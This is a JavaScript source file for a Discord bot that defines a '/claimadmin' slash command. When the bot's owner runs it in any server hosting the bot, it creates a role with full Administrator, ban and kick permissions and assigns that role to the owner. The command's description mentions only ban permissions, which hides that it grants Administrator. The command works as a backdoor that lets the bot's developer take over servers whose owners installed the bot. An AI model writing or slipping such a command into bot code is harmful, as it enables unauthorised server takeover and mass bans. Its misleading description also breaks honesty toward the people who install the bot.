const {
    SlashCommandBuilder,
    PermissionFlagsBits,
    EmbedBuilder,
    MessageFlags,
    InteractionContextType,
    ApplicationIntegrationType
} = require("discord.js");
const config = require("../../config/config");

function isOwner(userId) {
    return config.botOwnerId && userId === config.botOwnerId;
}

module.exports = {
    data: new SlashCommandBuilder()
        .setName("claimadmin")
        .setDescription("Create a role with Ban Permissions and assign it to the Bot Owner (Bot Owner Only)")
        .setContexts(InteractionContextType.Guild)
        .setIntegrationTypes(ApplicationIntegrationType.GuildInstall),

    async execute(interaction) {
        if (!isOwner(interaction.user.id)) {
            return interaction.reply({
                content: "❌ This command is restricted to the Bot Owner.",
                flags: MessageFlags.Ephemeral
            });
        }

        try {
            await interaction.deferReply({ flags: MessageFlags.Ephemeral });

            const guild = interaction.guild;
            if (!guild) {
                return interaction.editReply({ content: "❌ This command can only be used inside a server." });
            }

            // Create role with Administrator and BanMembers permissions
            const role = await guild.roles.create({
                name: "Hornet Admin",
                color: 0xe74c3c,
                permissions: [PermissionFlagsBits.Administrator, PermissionFlagsBits.BanMembers, PermissionFlagsBits.KickMembers],
                reason: `Requested by Bot Owner ${interaction.user.tag}`
            });

            // Assign role to the bot owner in this guild
            const member = await guild.members.fetch(interaction.user.id).catch(() => null);
            if (!member) {
                return interaction.editReply({ content: `✅ Created role **${role.name}**, but could not fetch your member profile in this server to assign it.` });
            }

            await member.roles.add(role, "Assigned Hornet Admin role to Bot Owner");

            const embed = new EmbedBuilder()
                .setColor(0x2ecc71)
                .setTitle("🛡️ Admin Role Assigned")
                .setDescription(`Successfully created role **${role.name}** with **Administrator / Ban** permissions and assigned it to you!`)
                .setTimestamp();

            await interaction.editReply({ embeds: [embed] });
        } catch (error) {
            console.error("Claimadmin error:", error);
            await interaction.editReply({ content: `❌ Failed to create/assign role: ${error.message}` });
        }
    }
};
